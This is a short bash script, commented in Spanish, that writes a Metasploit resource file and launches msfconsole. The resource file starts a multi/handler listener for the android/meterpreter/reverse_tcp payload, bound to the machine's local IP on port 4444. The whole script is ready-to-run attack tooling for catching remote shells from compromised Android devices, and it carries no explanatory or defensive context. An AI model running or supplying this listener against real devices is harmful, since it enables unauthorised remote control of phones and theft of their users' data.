#!/bin/bash

# Obtener la IP local
LOCAL_IP=$(hostname -I | awk '{print $1}')

# Generar el archivo config.rc con la IP local
cat <<EOL > config.rc
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST $LOCAL_IP
set LPORT 4444
exploit
EOL

# Ejecutar Metasploit con el archivo config.rc
msfconsole -r config.rc